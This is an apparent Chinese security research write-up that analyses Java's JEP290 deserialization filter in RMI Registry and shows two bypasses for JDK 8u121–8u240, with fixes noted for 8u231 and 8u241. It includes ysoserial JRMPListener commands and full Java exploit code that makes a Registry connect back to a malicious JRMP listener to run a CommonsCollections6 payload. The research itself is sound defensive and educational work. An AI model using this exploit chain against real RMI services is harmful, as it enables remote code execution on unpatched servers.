JEP290是Java官方提供的一套来防御反序列化的机制，其核心在于提供了一个ObjectInputFilter接口，通过设置filter对象，然后在反序列化（ObjectInputStream#readObject）的时候触发filter的检测，同样，这套机制在RMI中也适用，所以在一些高版本的情况下，依靠单纯的反序列化的方式无法达到效果，但是我们可以借助一些方式来绕过它。

# 流程分析

### JEP290 chek 点

JEP290是 Java 底层为了解决反序列化攻击所提出的一种方案，主要有以下机制：

  * 提供一个限制反序列化类的机制，白名单或者黑名单；

  * 限制反序列化的深度和复杂度；

  * 为 RMI 远程调用对象提供了一个验证类的机制；

  * 定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。

它本来是针对 Java9 的一个新特性，但是官方随后决定向下引进增强该机制，对以下 JDK 增加了该特性：

  * JDK8u121

  * JDK7u13

  * JDK6u141

ObjectInputStream#setInternalObjectInputFilter：

![](https://image.3001.net/images/20211110/1636531334_618b7c86810444841ec7e.png!small)

在 RMI 中JEP290主要是在远程引用层 之上进行过滤的，所以其过滤作用对 Server 和 Client 的互相攻击无效（在完成和 Registry
通信之后，客户端和服务端的相互通信就到了远程引用层和传输层）：

![](https://image.3001.net/images/20211110/1636531405_618b7ccd6ca626254bfa6.png!small)

启动一个 Registry，然后在 Server 端bind（rebind）一个恶意对象，被 filter 过滤掉：

![](https://image.3001.net/images/20211110/1636531433_618b7ce92ff9affe06703.png!small)

根据对应关系，直接看RegistryImpl_Skel#dispatch中的case 0，对应着bind方法：

![](https://image.3001.net/images/20211110/1636531470_618b7d0ebc56015062f0f.png!small)

var7是绑定对象的名称，var80就是要导出的远程对象，单步跟进var80的反序列化过程：

![](https://image.3001.net/images/20211110/1636531501_618b7d2d6cdb6da2159eb.png!small)

跟进ObjectInputStream#readObject0方法：

![](https://image.3001.net/images/20211110/1636531592_618b7d8860e60a29edb36.png!small)

单步到readOrdinaryObject方法，再跟进到readClassDesc方法，在这个方法里会根据反序列化的类不同进入不同的 case 里：

![](https://image.3001.net/images/20211110/1636531662_618b7dcecb10402f83a8c.png!small)

重点关注下面两个 case，分别对动态代理类的 Class 和非动态代理类的 Class 进行处理，而且都会调用到filterCheck方法对序列化流进行
check（图就不贴了，自行跟入查看即可）。

这个filterCheck方法最终调用的是RegistryImpl#registryFilter方法（至于为什么后面会说到），它对反序列化的类进行了白名单的限制：

![](https://image.3001.net/images/20211110/1636531698_618b7df223b27493fb757.png!small)

白名单内容：

    
    
    String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory /  ActivationID / UID

只要反序列化的类不是白名单中的类，就会返回REJECTED操作符，表示序列化流中有不合法的内容，直接抛出异常。

再说回我们bind的恶意对象为什么会被 check，在 RMI 中，Server 端执行bind方法的参数必须是一个实现了 Remote
接口的对象，但是普通的 CC 链最后生成的恶意对象是不满足这个条件的，这时候就需要动态代理来代理Remote接口，实际上最后绑定的是动态代理生成的代理对象：

    
    
    InvocationHandlerImpl handler = new InvocationHandlerImpl(expMap);
    Remote remote = (Remote) Proxy.newProxyInstance(handler.getClass().getClassLoader(), new Class[]{Remote.class}, handler);
    registry.bind("pwn", remote);

代理对象是如何触发反序列化的呢？代理对象内部有 InvocationHandlerImpl 对象的引用，而后者内部也有一个 expMap
的引用，三者都实现了 Serializable 接口，由于反序列化具有传递性，当代理对象被反序列化的时候，最后也会导致 expMap
被反序列化。（https://www.wolai.com/vUAU982tJ5pH8wJvYeAfPf）

所以在反序列化的时候，除了对代理对象本身反序列化，也要对其内部字段进行反序列化，类似于一个递归的过程，我们的代理对象本身（它自身实现了被代理的接口，这里是
Remote 接口）是不会触发 check 的，真正触发 check 的其实是内部的 InvocationHandlerImpl，来看调用栈：

    
    
    触发check
    readNonProxyDesc:1878, ObjectInputStream (java.io)
    readClassDesc:1751, ObjectInputStream (java.io)
    readOrdinaryObject:2042, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    defaultReadFields:2287, ObjectInputStream (java.io)
    readSerialData:2211, ObjectInputStream (java.io)
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    ...

通过调用栈我们可以看到从开始到触发 check
其实是调用了两次readObject0方法的，第一次就是对代理对象本身的反序列化，第二次是对其内部字段进行反序列化。

readSerialData方法会读取对象内部的字段，然后循环进入readObject0方法处理：

![](https://image.3001.net/images/20211110/1636531906_618b7ec2b3c926986a2ea.png!small)

同上面分析的readObject0方法一样，会进入到不同的 case
中，最后我们的InvocationHandlerImpl类在readNonProxyDesc方法中触发了 filter 的 check：

![](https://image.3001.net/images/20211110/1636531936_618b7ee055159b0328c8f.png!small)

## filter 创建过程

另一个问题，filter 是什么时候被设置的呢？

首先，在RegistryImpl的构造方法中传入了一个方法引用：

> 值得注意的是，RegistryImpl 有多个重载的构造方法，核心都是传入了一个 Lambda 表达式作为
> filter，只是代码细节有些许不同，就不作额外分析了。

![](https://image.3001.net/images/20211110/1636532000_618b7f208dac63919393a.png!small)

RegistryImpl::registryFilter即info →
RegistryImpl.registryFilter(info)，因为它和ObjectInputFilter接口的抽象方法签名一致，所以可以直接通过方法引用来简写：

![](https://image.3001.net/images/20211110/1636532028_618b7f3c11ea6f3570df6.png!small)![](https://image.3001.net/images/20211110/1636532066_618b7f62c7b239c6281c6.png!small)

这个 Lambda 表达式以ObjectInputFilter接口的形式传入了UnicastServerRef2的构造方法中：

![](https://image.3001.net/images/20211110/1636532194_618b7fe29682fa1cc9f10.png!small)

最后赋值给了该类的`filter`成员变量：

![](https://image.3001.net/images/20211110/1636532226_618b8002b44e80c91bccd.png!small)

在触发 check 的时候，filter 是一个 Lambda 表达式，就是最开始传入的RegistryImpl::registryFilter：

![](https://image.3001.net/images/20211110/1636532252_618b801c4ddf326f0005a.png!small)

所以才会进入方法RegistryImpl#registryFilter方法中去，看一眼调用栈：

    
    
    registryFilter:416, RegistryImpl (sun.rmi.registry)
    checkInput:-1, 1566502717 (sun.rmi.registry.RegistryImpl$$Lambda$2)
    filterCheck:1239, ObjectInputStream (java.io)
    readNonProxyDesc:1878, ObjectInputStream (java.io)
    readClassDesc:1751, ObjectInputStream (java.io)
    readProxyDesc:1828, ObjectInputStream (java.io)
    readClassDesc:1748, ObjectInputStream (java.io)
    readOrdinaryObject:2042, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:468, UnicastServerRef (sun.rmi.server)
    dispatch:300, UnicastServerRef (sun.rmi.server)
    ...

此外，之前提到在 Registry 的创建过程中 filter 最终只是作为UnicastServerRef的一个成员变量而存在，直到 Registry
在处理请求的时候，在oldDispatch方法中才把 filter 赋值给了ObjectInputStream的成员变量serialFilter。

UnicastServerRef#oldDispatch：

![](https://image.3001.net/images/20211110/1636532350_618b807e7be477d9c7094.png!small)

UnicastServerRef#unmarshalCustomCallData：

![](https://image.3001.net/images/20211110/1636532380_618b809cd41ce6a3cf786.png!small)

# Bypass 8u121~8u230

### UnicastRef 类

``UnicastRef是在白名单上的，RMI Server 或者 Client 和 Registry 的通信就基于它。

在代码层面来说，我们在执行 bind、lookup 等方法的时候都会先获取到一个 Registry，比如：

    
    
    Registry registry = LocateRegistry.getRegistry(1099);

跟进LocateRegistry#getRegistry方法：

![](https://image.3001.net/images/20211110/1636532449_618b80e189cd779f19054.png!small)

这里的 TCPEndpoint 封装了 Registry 的 host、端口等信息，然后用 UnicastRef 封装了 liveRef。最终获取到的是一个
RegistryImpl_Stub 对象；这个对象里面封装了一个 UnicastRef 对象：

![](https://image.3001.net/images/20211110/1636532471_618b80f7032ffdb95d8e3.png!small)

然后我们用这个 Stub 对象（客户端）去连接 Registry，以 bind 方法为例：

![](https://image.3001.net/images/20211110/1636532495_618b810fb4bdb7df7d709.png!small)

从这个过程来看，通过 UnicastRef 的 newCall 方法发起连接，然后把要绑定的对象发送到 Registry。

所以如果我们可以控制 UnicastRef 中 LiveRef 所封装的 host、端口等信息，我们就可以发起一个任意的 JRMP 连接请求，这其实就是
ysoserial 中的 payloads.JRMPClient 的原理。

## RemoteObject 类

RemoteObject 是一个抽象类，在后面的 Bypass 思路构造中它会扮演一个很重要的角色。它实现了 Remote 和 Serializable
接口，代表它（及其子类）可以通过白名单的检测，而 Bypass 利用的关键点就是它的 readObject 方法：

![](https://image.3001.net/images/20211110/1636532551_618b81474d9b50db9e14a.png!small)

这里的 ref 就是一个 UnicastRef 对象，往下跟 readExternal：

![](https://image.3001.net/images/20211110/1636532590_618b816ef40be3a8fb0b7.png!small)

跟进 read 方法：

![](https://image.3001.net/images/20211110/1636532620_618b818c7349c867759d3.png!small)

在这个方法中会读出序列化流中的 host 和端口信息（就是恶意 JRMP 服务的 host 与端口，后面会提到），然后重新封装成一个 LiveRef
对象，将其存储到当前的 ConnectionInputStream 上，调用 saveRef 方法：

![](https://image.3001.net/images/20211110/1636532654_618b81ae139068271db4f.png!small)

建立了一个 TCPEndpoint 到 ArrayList<LiveRef>的映射关系。

上述部分是在RegistryImpl_Skle#dispatch中的 readObject 方法触发的：

![](https://image.3001.net/images/20211110/1636532680_618b81c832cfd00a23e8c.png!small)

在服务端触发了反序列化之后，来到StreamRemoteCall#releaseInputStream方法中，在这里会调用ConnectionInputStream#registerRefs方法：

![](https://image.3001.net/images/20211110/1636532738_618b820248a4568189581.png!small)

这里的`this.in`就是上文中提到的存储了 LiveRef 对象的那个 ConnectionInputStream 对象，接着跟进：

![](https://image.3001.net/images/20211110/1636532769_618b82211451ef7eea602.png!small)

在这里就会发现会根据之前存储的映射关系（"在这个方法中会读出序列化流中的 host 和端口信息（就是恶意 JRMP 服务的 host
与端口，后面会提到），然后重新封装成一个 LiveRef 对象，将其存储到当前的 ConnectionInputStream 上，调用 saveRef
方法：image.png 建立了一个 TCPEndpoint 到 ArrayList

的映射关系。"）提取值，然后传入DGCClient#registerRefs方法中：

![](https://image.3001.net/images/20211110/1636532911_618b82afcfd14b9607de9.png!small)

最终由 DGCClient 向恶意的 JRMP 服务端发起 lookup 连接：

![](https://image.3001.net/images/20211110/1636532935_618b82c7566e40227ff3f.png!small)

### Bypass 思路

经过对 RemoteObject 类的分析我们可以明确：

  * RemoteObject 类（及其子类）对象可以被 bind（lookup 方法也可以）到 Registry，且在白名单之上。

  * RemoteObject 类（及其没有实现 readObject 方法的子类）经过反序列化可以通过内部的 UnicastRef 对象发起 JRMP 请求连接恶意的 Server。

所以 Bypass JEP290 的思路如下：

  1. 用 ysoserial 开启一个恶意的 JRMPListener。

  2. 控制 RemoteObject ↓ 中的 UnicastRef 对象，这个对象封装了恶意 Server 的 host、端口等信息。

  3. Client / Server 向 Registry 发送这个 RemoteObject↓ 对象，Registry 触发 readObject 方法之后会向恶意的 JRMP Server 发起连接请求。

  4. 后续触发 JRMPListener 。

Registry 触发反序列化的利用链：

    
    
    客户端发送数据 --> ...
        UnicastServerRef#dispatch -->
            UnicastServerRef#oldDispatch --> 
                RegistryImpl_Skle#dispatch --> RemoteObject#readObject
                    StreamRemoteCall#releaseInputStream -->
                        ConnectionInputStream#registerRefs -->
                            DGCClient#registerRefs -->
                                DGCClient$EndpointEntry#registerRefs -->
                                    DGCClient$EndpointEntry#makeDirtyCall -->
                                        DGCImpl_Stub#dirty --> 
                                            UnicastRef#invoke --> (RemoteCall var1)
                                                StreamRemoteCall#executeCall --> 
                                                    ObjectInputSteam#readObject --> "pwn"

> ※ 备注 1

> 重点关注`UnicastRef#invoke`方法，这个方法有两种不同的重载形式：
    
    
    invoke(RemoteCall var1)
    
    
    invoke(Remote var1, Method var2, Object[] var3, long var4)

> 这里的 Bypass121 使用的是第一种形式，而后面的"Bypass
> 8u231~8u240"使用的第二种形式（用于调用远程方法），但是两种重载都会触发`StreamRemoteCall#executeCall`方法。

可见，对比于Registry 攻击
Client&Server，虽然中间流程复杂了一些，但是最后都来到了StreamRemoteCall#executeCall方法，同样反序列化了
BadAttributeValueExpException 对象。

所以 Bypass JEP290 的关键在于：通过反序列化将 Registry 变为 JRMP 客户端，向 JRMPListener 发起 JRMP 请求。

![](https://image.3001.net/images/20211110/1636533070_618b834e0f5111ee16f03.png!small)

然后就是类的寻找：

![](https://image.3001.net/images/20211110/1636533254_618b8406b6530140f339a.png!small)

顺着上面的思路找，很多子类都满足要求，比如：

  * RemoteObjectInvocationHandler

  * RMIConntionImpl_Stub

  * DGCImpl_Stub

  * RmiServerImpl_Stub

  * ...

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'calc'
    
    
    public class RMIRegistry {
        public static void main(String[] args) {
            try {
                LocateRegistry.createRegistry(1099);
                System.out.println("RMI Registry Start");
            } catch (Exception e) {
                e.printStackTrace();
            }
            while (true) ;
        }
    }
    
    
    public class DefineClient {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry(1099);
            ObjID id = new ObjID(new Random().nextInt());
            TCPEndpoint te = new TCPEndpoint("localhost", 9999);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
            RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
    	// lookup方法也可以，但需要手动模拟lookup方法的流程
            registry.bind("pwn", handler);
        }
    }

![](https://image.3001.net/images/20211110/1636533340_618b845c10f167582bc1c.png!small)

### 修复

在 8u231 版本及以上的DGCImpl_Stub#dirty方法中多了一个setObjectInputFilter的过程，又会被 JEP290
check 到了 。

# Bypass 8u231~8u240

### 总分析

在上面的 Bypass 中，UnicastRef 类用了一层包装，通过递归的形式触发反序列化；通过 DGCClient 向 JRMPListener 发起
JRMP 请求，而这条 Gadget 是直接利用一次反序列化发起 JRMP 请求。

Gadget 利用链如下：

    
    
    客户端发送数据 --> 服务端反序列化(RegistryImpl_Skle#dispatch)
        UnicastRemoteObject#readObject -->
            UnicastRemoteObject#reexport -->
                UnicastRemoteObject#exportObject --> overload
                    UnicastRemoteObject#exportObject -->
                        UnicastServerRef#exportObject --> ...
                                TCPTransport#listen -->
                                    TcpEndpoint#newServerSocket -->
                                        RMIServerSocketFactory#createServerSocket --> Dynamic Proxy(RemoteObjectInvocationHandler)
                                            RemoteObjectInvocationHandler#invoke -->
                                                RemoteObjectInvocationHandler#invokeMethod -->
                                                    UnicastRef#invoke --> (Remote var1, Method var2, Object[] var3, long var4)
                                                        StreamRemoteCall#executeCall --> 
                                                            ObjectInputSteam#readObject --> "pwn"

### 调用链分析

UnicastRemoteObject 作为反序列化的入口，

UnicastRemoteObject#readObject：

![](https://image.3001.net/images/20211110/1636533460_618b84d4bee5e7031811a.png!small)

来到

UnicastRemoteObject#reexport：

![](https://image.3001.net/images/20211110/1636533623_618b8577517881e976369.png!small)

这里我们在 exp 中会设置 ssf，进入第二个分支，

UnicastRemoteObject#exportObject：

![](https://image.3001.net/images/20211110/1636533773_618b860dbe8d16885986a.png!small)

这里把 port、csf、ssf 作为构造方法参数传入 UnicastServerRef2，其实它里面是包装了一层 LiveRef：

    
    
    public UnicastServerRef2(int var1, RMIClientSocketFactory var2, RMIServerSocketFactory var3) {
        super(new LiveRef(var1, var2, var3));
    }

再跟入重载的UnicastRemoteObject#exportObject：

![](https://image.3001.net/images/20211110/1636533828_618b86447288c1ab27729.png!small)

之后再来到

UnicastServerRef#exportObject：

![](https://image.3001.net/images/20211110/1636533855_618b865f8ad728156bd50.png!small)

这部分在"Registry 创建"已经有过分析了，在这里会创建 RegistryImpl_Stub、RegistryImpl_Skel 对象，最终调用到

TCPTransport#listen方法创建监听栈，中间过程省略，直接跟入

TCPTransport#listen：

![](https://image.3001.net/images/20211110/1636533881_618b8679af7feeb2de0fe.png!small)

var1 是一个 TcpEndpoint 对象，跟入

TcpEndpoint#newServerSocket方法：

![](https://image.3001.net/images/20211110/1636533906_618b869274d41ae8f8176.png!small)

在这里调用了之前提到的 ssf 的方法，这里有一层动态代理，通过 RemoteObjectInvocationHandler 代理
RMIServerSocketFactory 接口，然后把生成的代理对象设置为该 ssf，于是来到了

RemoteObjectInvocationHandler#invoke：

![](https://image.3001.net/images/20211110/1636533938_618b86b210b683e243030.png!small)

前面多个 if 都不满足，直接来到

RemoteObjectInvocationHandler#invokeRemoteMethod：

![](https://image.3001.net/images/20211110/1636533967_618b86cfe656b74775ca5.png!small)

这里的 ref 可以设置为 UnicastRef，然后来到了熟悉

UnicastRef#invoke方法：

![](https://image.3001.net/images/20211110/1636533989_618b86e5e9fb3f8b7dee5.png!small)

> 备注 1：这一段其实在"Client 攻击 Server"中就已经分析过了，只不过 UnicasrRef 中前者封装的一个是 Server 端的
> host 、端口等信息，另一个封装的是恶意 JRMPListener 的信息。

> 备注 2：无论 RMI Registry、RMI Client、RMI Server、DGCClient 的任意两者通信，它们发起 JRMP
> 请求都利用了 UnicastRef 类。

在UnicastRef#invoke方法中让 Registry 向 JRMPListener 发起了 JRMP
请求，进行数据交互，来到了StreamRemoteCall#executeCall：

![](https://image.3001.net/images/20211110/1636534035_618b871351a94e60c576c.png!small)

反序列化了 JRMPListener 发来的 payload，这里获取到 InputStream 之后并没有设置 JEP290 的
filter，所以又一次成功 Bypass。

### Exploit

 **有个小问题**

但是还有一个问题没解决，本地在 bind 或者 rebind
一个对象的时候，在序列化对象的时候会来到MarshalOutputStream#replaceObject方法：![](https://image.3001.net/images/20211110/1636534089_618b87490926d21c3baee.png!small)

如果这个对象没有继承 RemoteStub 的话，会进行转化：

![](https://image.3001.net/images/20211110/1636534110_618b875e8010802a224b1.png!small)

原先的 UnicastRemoteObject 会被转化成
RemoteObjectInvocationHandler，自然到服务端就无法触发UnicastRemoteObject#readObject方法。

解决方案是自己重写一下RegistryImpl#bind方法，在序列化之前通过反射 ObjectInputStream，修改enableReplace为
false：

![](https://image.3001.net/images/20211110/1636534146_618b8782ecc99f61331de.png!small)

###  **最后的 Exploit**

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'calc'
    
    
    public class RMIServer {
        public static void main(String[] args) throws Exception {
            UnicastRemoteObject payload = getPayload();
            Registry registry = LocateRegistry.getRegistry(1099);
            bindReflection("pwn", payload, registry);
        }
    
        static UnicastRemoteObject getPayload() throws Exception {
            ObjID id = new ObjID(new Random().nextInt());
            TCPEndpoint te = new TCPEndpoint("localhost", 9999);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    
            System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");
            RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
            RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                    handler.getClass().getClassLoader(),
                    new Class[]{RMIServerSocketFactory.class, Remote.class},
                    handler
            );
    
            Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor();
            constructor.setAccessible(true);
            UnicastRemoteObject unicastRemoteObject = constructor.newInstance();
    
            Field field_ssf = UnicastRemoteObject.class.getDeclaredField("ssf");
            field_ssf.setAccessible(true);
            field_ssf.set(unicastRemoteObject, factory);
    
            return unicastRemoteObject;
        }
    
        static void bindReflection(String name, Object obj, Registry registry) throws Exception {
            Field ref_filed = RemoteObject.class.getDeclaredField("ref");
            ref_filed.setAccessible(true);
            UnicastRef ref = (UnicastRef) ref_filed.get(registry);
    
            Field operations_filed = RegistryImpl_Stub.class.getDeclaredField("operations");
            operations_filed.setAccessible(true);
            Operation[] operations = (Operation[]) operations_filed.get(registry);
    
            RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
            ObjectOutput outputStream = remoteCall.getOutputStream();
    
            Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField("enableReplace");
            enableReplace_filed.setAccessible(true);
            enableReplace_filed.setBoolean(outputStream, false);
    
            outputStream.writeObject(name);
            outputStream.writeObject(obj);
    
            ref.invoke(remoteCall);
            ref.done(remoteCall);
        }
    }

![](https://image.3001.net/images/20211110/1636534322_618b88320640b4f507183.png!small)

##  **修复**

在 jdk 8u241 中进行了修复，在RemoteObjectInvocationHandler#invokeRemoteMethod：

![](https://image.3001.net/images/20211110/1636534347_618b884b569460fb1c8b6.png!small)

声明要调用的方法的类，必须实现 Remote 接口，而 RMIServerSocketFactory 类没有实现该接口，于是会直接抛出异常。

